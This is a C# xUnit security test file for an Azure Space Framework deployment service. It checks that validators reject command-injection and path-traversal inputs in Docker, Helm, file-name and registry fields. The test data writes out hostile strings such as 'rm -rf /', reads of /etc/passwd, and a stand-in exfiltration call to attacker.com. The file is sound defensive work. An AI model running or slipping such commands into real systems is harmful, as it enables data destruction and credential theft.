using Xunit;

namespace Microsoft.Azure.SpaceFx.PlatformServices.Deployment.Tests.Security;

/// <summary>
/// Security tests for command injection vulnerabilities in the Platform Deployment service.
/// These tests verify that input validation properly prevents malicious inputs from being
/// passed to shell commands, which could lead to command injection attacks.
/// </summary>
public class CommandInjectionTests {
    /// <summary>
    /// Test that validates Docker image names are properly validated to prevent command injection.
    /// </summary>
    [Theory]
    [InlineData("myapp", true)]  // Valid: simple name
    [InlineData("my-app", true)]  // Valid: with hyphen
    [InlineData("my_app", true)]  // Valid: with underscore
    [InlineData("registry.local/myapp", true)]  // Valid: with registry
    [InlineData("registry.local:5000/myapp", true)]  // Valid: with registry and port
    [InlineData("my.app/sub/image", true)]  // Valid: nested path
    [InlineData("app123", true)]  // Valid: with numbers
    [InlineData("123app", true)]  // Valid: starting with number
    [InlineData("MyApp", false)]  // Invalid: uppercase letters
    [InlineData("app;rm -rf /", false)]  // ATTACK: command injection with semicolon
    [InlineData("app`whoami`", false)]  // ATTACK: command substitution with backticks
    [InlineData("app$(whoami)", false)]  // ATTACK: command substitution with $()
    [InlineData("app&echo vulnerable", false)]  // ATTACK: command chaining with &
    [InlineData("app|cat /etc/passwd", false)]  // ATTACK: command piping
    [InlineData("app\nrm -rf /", false)]  // ATTACK: newline injection
    [InlineData("app'test'", false)]  // ATTACK: single quotes
    [InlineData("app\"test\"", false)]  // ATTACK: double quotes
    [InlineData("app<script>", false)]  // ATTACK: angle brackets
    [InlineData("app>output", false)]  // ATTACK: redirection
    [InlineData("../../../etc/passwd", false)]  // ATTACK: path traversal
    [InlineData("app!test", false)]  // Invalid: exclamation mark
    [InlineData("app#test", false)]  // Invalid: hash symbol
    [InlineData("app test", false)]  // Invalid: space
    [InlineData("", false)]  // Invalid: empty string
    [InlineData("   ", false)]  // Invalid: whitespace only
    [InlineData("-app", false)]  // Invalid: starts with hyphen
    [InlineData(".app", false)]  // Invalid: starts with dot
    [InlineData("app.", false)]  // Invalid: ends with dot
    [InlineData("app-", false)]  // Invalid: ends with hyphen
    public void TestDockerImageNameValidation(string imageName, bool expectedValid) {
        // Act
        bool isValid = Utils.InputValidation.IsValidDockerImageName(imageName);

        // Assert
        Assert.Equal(expectedValid, isValid);
    }

    /// <summary>
    /// Test that validates Docker tags are properly validated to prevent command injection.
    /// </summary>
    [Theory]
    [InlineData("latest", true)]  // Valid: simple tag
    [InlineData("v1.0.0", true)]  // Valid: version tag
    [InlineData("build_123", true)]  // Valid: with underscore
    [InlineData("sha-abc123", true)]  // Valid: with hyphen
    [InlineData("Tag123", true)]  // Valid: with uppercase
    [InlineData("v1.0.0-rc1", true)]  // Valid: complex version
    [InlineData("tag;rm -rf /", false)]  // ATTACK: command injection with semicolon
    [InlineData("tag`whoami`", false)]  // ATTACK: command substitution
    [InlineData("tag$(whoami)", false)]  // ATTACK: command substitution
    [InlineData("tag&echo test", false)]  // ATTACK: command chaining
    [InlineData("tag|cat /etc/passwd", false)]  // ATTACK: piping
    [InlineData("tag\nmalicious", false)]  // ATTACK: newline injection
    [InlineData("tag'test'", false)]  // ATTACK: quotes
    [InlineData("tag\"test\"", false)]  // ATTACK: quotes
    [InlineData("tag test", false)]  // Invalid: space
    [InlineData("tag<test>", false)]  // Invalid: angle brackets
    [InlineData("tag>output", false)]  // Invalid: redirection
    [InlineData("", false)]  // Invalid: empty string
    [InlineData("   ", false)]  // Invalid: whitespace
    [InlineData("a", true)]  // Valid: single character
    [InlineData(new string('a', 128), true)]  // Valid: max length (128 chars)
    [InlineData(new string('a', 129), false)]  // Invalid: too long
    public void TestDockerTagValidation(string tag, bool expectedValid) {
        // Act
        bool isValid = Utils.InputValidation.IsValidDockerTag(tag);

        // Assert
        Assert.Equal(expectedValid, isValid);
    }

    /// <summary>
    /// Test that validates Helm parameter keys are properly validated to prevent command injection.
    /// </summary>
    [Theory]
    [InlineData("services.app.enabled", true)]  // Valid: nested parameter
    [InlineData("replicas", true)]  // Valid: simple parameter
    [InlineData("image-tag", true)]  // Valid: with hyphen
    [InlineData("image_tag", true)]  // Valid: with underscore
    [InlineData("version1", true)]  // Valid: with number
    [InlineData("key;whoami", false)]  // ATTACK: command injection
    [InlineData("key`ls`", false)]  // ATTACK: command substitution
    [InlineData("key$(ls)", false)]  // ATTACK: command substitution
    [InlineData("key&rm", false)]  // ATTACK: command chaining
    [InlineData("key|cat", false)]  // ATTACK: piping
    [InlineData("key\nmalicious", false)]  // ATTACK: newline injection
    [InlineData("key'test'", false)]  // ATTACK: quotes
    [InlineData("key\"test\"", false)]  // ATTACK: quotes
    [InlineData("key test", false)]  // Invalid: space
    [InlineData("key<test>", false)]  // Invalid: angle brackets
    [InlineData("", false)]  // Invalid: empty
    [InlineData("   ", false)]  // Invalid: whitespace
    public void TestHelmParameterKeyValidation(string parameterKey, bool expectedValid) {
        // Act
        bool isValid = Utils.InputValidation.IsValidHelmParameterKey(parameterKey);

        // Assert
        Assert.Equal(expectedValid, isValid);
    }

    /// <summary>
    /// Test that validates Helm parameter values are properly validated to prevent command injection.
    /// </summary>
    [Theory]
    [InlineData("true", true)]  // Valid: boolean
    [InlineData("false", true)]  // Valid: boolean
    [InlineData("my-app-v1.0", true)]  // Valid: version string
    [InlineData("2023-01-01T00:00:00Z", true)]  // Valid: timestamp
    [InlineData("path/to/resource", true)]  // Valid: path
    [InlineData("app namespace", true)]  // Valid: with space
    [InlineData("value_123", true)]  // Valid: with underscore and numbers
    [InlineData("value;whoami", false)]  // ATTACK: command injection
    [InlineData("value`ls`", false)]  // ATTACK: command substitution
    [InlineData("value$(ls)", false)]  // ATTACK: command substitution
    [InlineData("value&rm", false)]  // ATTACK: command chaining
    [InlineData("value|cat", false)]  // ATTACK: piping
    [InlineData("value\nmalicious", false)]  // ATTACK: newline injection
    [InlineData("value'test'", false)]  // ATTACK: single quotes
    [InlineData("value\"test\"", false)]  // ATTACK: double quotes
    [InlineData("value<script>", false)]  // Invalid: angle brackets
    [InlineData("value>output", false)]  // Invalid: redirection
    [InlineData("", false)]  // Invalid: empty
    [InlineData("   ", false)]  // Invalid: whitespace only
    public void TestHelmParameterValueValidation(string parameterValue, bool expectedValid) {
        // Act
        bool isValid = Utils.InputValidation.IsValidHelmParameterValue(parameterValue);

        // Assert
        Assert.Equal(expectedValid, isValid);
    }

    /// <summary>
    /// Test that validates file names are properly validated to prevent path traversal and command injection.
    /// </summary>
    [Theory]
    [InlineData("config.yaml", true)]  // Valid: simple file
    [InlineData("app-v1.0.tar", true)]  // Valid: version in name
    [InlineData("model_123.pkl", true)]  // Valid: with underscore
    [InlineData("data.tar.gz", true)]  // Valid: multiple extensions
    [InlineData("file-name_v1.2.3.tar", true)]  // Valid: complex name
    [InlineData("../../../etc/passwd", false)]  // ATTACK: path traversal
    [InlineData("..\\..\\..\\windows\\system32", false)]  // ATTACK: Windows path traversal
    [InlineData("file;rm -rf /", false)]  // ATTACK: command injection
    [InlineData("file`whoami`", false)]  // ATTACK: command substitution
    [InlineData("file$(whoami)", false)]  // ATTACK: command substitution
    [InlineData("file&echo test", false)]  // ATTACK: command chaining
    [InlineData("file|cat", false)]  // ATTACK: piping
    [InlineData("file\nmalicious", false)]  // ATTACK: newline injection
    [InlineData("file'test'", false)]  // ATTACK: quotes
    [InlineData("file\"test\"", false)]  // ATTACK: quotes
    [InlineData("file test.txt", false)]  // Invalid: space
    [InlineData("/etc/passwd", false)]  // ATTACK: absolute path
    [InlineData("subdir/file.txt", false)]  // Invalid: contains slash
    [InlineData("file<test>", false)]  // Invalid: angle brackets
    [InlineData("file>output", false)]  // Invalid: redirection
    [InlineData("", false)]  // Invalid: empty
    [InlineData("   ", false)]  // Invalid: whitespace
    public void TestFileNameValidation(string fileName, bool expectedValid) {
        // Act
        bool isValid = Utils.InputValidation.IsValidFileName(fileName);

        // Assert
        Assert.Equal(expectedValid, isValid);
    }

    /// <summary>
    /// Test that validates file paths to prevent path traversal attacks.
    /// </summary>
    [Fact]
    public void TestFilePathValidation_ValidPathsWithinBaseDirectory() {
        // Arrange
        string baseDir = "/var/data";

        // Act & Assert - Valid paths within base directory
        Assert.True(Utils.InputValidation.IsValidFilePath("/var/data/file.txt", baseDir));
        Assert.True(Utils.InputValidation.IsValidFilePath("/var/data/subdir/file.txt", baseDir));
    }

    [Fact]
    public void TestFilePathValidation_PathTraversalAttacks() {
        // Arrange
        string baseDir = "/var/data";

        // Act & Assert - Path traversal attempts should be rejected
        Assert.False(Utils.InputValidation.IsValidFilePath("/var/data/../etc/passwd", baseDir));
        Assert.False(Utils.InputValidation.IsValidFilePath("/etc/passwd", baseDir));
        Assert.False(Utils.InputValidation.IsValidFilePath("../../../etc/passwd", baseDir));
    }

    [Fact]
    public void TestFilePathValidation_InvalidInputs() {
        // Arrange
        string baseDir = "/var/data";

        // Act & Assert - Invalid inputs should be rejected
        Assert.False(Utils.InputValidation.IsValidFilePath("", baseDir));
        Assert.False(Utils.InputValidation.IsValidFilePath("   ", baseDir));
        Assert.False(Utils.InputValidation.IsValidFilePath("/var/data/file.txt", ""));
    }

    /// <summary>
    /// Test that validates registry host names to prevent command injection.
    /// </summary>
    [Theory]
    [InlineData("registry.local", true)]  // Valid: simple hostname
    [InlineData("localhost", true)]  // Valid: localhost
    [InlineData("registry.local:5000", true)]  // Valid: with port
    [InlineData("localhost:5000", true)]  // Valid: localhost with port
    [InlineData("192.168.1.1", true)]  // Valid: IP address
    [InlineData("192.168.1.1:5000", true)]  // Valid: IP with port
    [InlineData("my-registry.example.com", true)]  // Valid: with subdomain
    [InlineData("registry.example.com:8080", true)]  // Valid: full hostname with port
    [InlineData("registry;rm -rf /", false)]  // ATTACK: command injection
    [InlineData("registry`whoami`", false)]  // ATTACK: command substitution
    [InlineData("registry$(whoami)", false)]  // ATTACK: command substitution
    [InlineData("registry&echo test", false)]  // ATTACK: command chaining
    [InlineData("registry|cat", false)]  // ATTACK: piping
    [InlineData("registry\nmalicious", false)]  // ATTACK: newline injection
    [InlineData("registry'test'", false)]  // ATTACK: quotes
    [InlineData("registry\"test\"", false)]  // ATTACK: quotes
    [InlineData("registry test", false)]  // Invalid: space
    [InlineData("registry<test>", false)]  // Invalid: angle brackets
    [InlineData("", false)]  // Invalid: empty
    [InlineData("   ", false)]  // Invalid: whitespace
    [InlineData("registry:99999", false)]  // Invalid: port number too large
    [InlineData("-registry.local", false)]  // Invalid: starts with hyphen
    public void TestRegistryHostValidation(string registryHost, bool expectedValid) {
        // Act
        bool isValid = Utils.InputValidation.IsValidRegistryHost(registryHost);

        // Assert
        Assert.Equal(expectedValid, isValid);
    }

    /// <summary>
    /// Test comprehensive attack scenarios combining multiple injection techniques.
    /// </summary>
    [Theory]
    [InlineData("app;sleep 10;")]  // Time-based attack
    [InlineData("app&&curl evil.com")]  // Data exfiltration attempt
    [InlineData("app||wget malicious.sh")]  // Alternative command execution
    [InlineData("app`curl http://attacker.com/$(cat /etc/passwd)`")]  // Nested command substitution
    [InlineData("app$IFS$9cat$IFS/etc/passwd")]  // IFS manipulation
    [InlineData("app\r\nmalicious")]  // CRLF injection
    [InlineData("app\\x00malicious")]  // Null byte injection attempt
    public void TestComprehensiveAttackScenarios(string maliciousInput) {
        // Act & Assert - All attack scenarios should be rejected
        Assert.False(Utils.InputValidation.IsValidDockerImageName(maliciousInput));
        Assert.False(Utils.InputValidation.IsValidDockerTag(maliciousInput));
        Assert.False(Utils.InputValidation.IsValidHelmParameterKey(maliciousInput));
        Assert.False(Utils.InputValidation.IsValidHelmParameterValue(maliciousInput));
        Assert.False(Utils.InputValidation.IsValidFileName(maliciousInput));
        Assert.False(Utils.InputValidation.IsValidRegistryHost(maliciousInput));
    }

    /// <summary>
    /// Test edge cases and boundary conditions.
    /// </summary>
    [Fact]
    public void TestEdgeCases_NullAndWhitespace() {
        // Act & Assert - Null and whitespace should be rejected
        Assert.False(Utils.InputValidation.IsValidDockerImageName(null!));
        Assert.False(Utils.InputValidation.IsValidDockerTag(null!));
        Assert.False(Utils.InputValidation.IsValidHelmParameterKey(null!));
        Assert.False(Utils.InputValidation.IsValidHelmParameterValue(null!));
        Assert.False(Utils.InputValidation.IsValidFileName(null!));
        Assert.False(Utils.InputValidation.IsValidRegistryHost(null!));
    }

    /// <summary>
    /// Test length limits to prevent buffer overflow and DoS attacks.
    /// </summary>
    [Fact]
    public void TestLengthLimits() {
        // Docker image name max: 255 characters
        Assert.True(Utils.InputValidation.IsValidDockerImageName(new string('a', 255)));
        Assert.False(Utils.InputValidation.IsValidDockerImageName(new string('a', 256)));

        // Docker tag max: 128 characters
        Assert.True(Utils.InputValidation.IsValidDockerTag(new string('a', 128)));
        Assert.False(Utils.InputValidation.IsValidDockerTag(new string('a', 129)));

        // File name max: 255 characters
        Assert.True(Utils.InputValidation.IsValidFileName(new string('a', 255)));
        Assert.False(Utils.InputValidation.IsValidFileName(new string('a', 256)));

        // Registry host max: 255 characters
        Assert.True(Utils.InputValidation.IsValidRegistryHost(new string('a', 255)));
        Assert.False(Utils.InputValidation.IsValidRegistryHost(new string('a', 256)));
    }

    /// <summary>
    /// Test that valid production-like values pass validation.
    /// </summary>
    [Fact]
    public void TestProductionValidValues() {
        // Realistic production values should all pass
        Assert.True(Utils.InputValidation.IsValidDockerImageName("registry.spacefx.local/shipdetector-onnx"));
        Assert.True(Utils.InputValidation.IsValidDockerTag("0.11.0"));
        Assert.True(Utils.InputValidation.IsValidDockerTag("0.11.0-nightly"));
        Assert.True(Utils.InputValidation.IsValidHelmParameterKey("services.payloadapp.payloadappTemplate.enabled"));
        Assert.True(Utils.InputValidation.IsValidHelmParameterValue("2023-01-01T00:00:00Z"));
        Assert.True(Utils.InputValidation.IsValidFileName("shipdetector-v1.0.0.tar"));
        Assert.True(Utils.InputValidation.IsValidRegistryHost("registry.spacefx.local:5000"));
    }
}
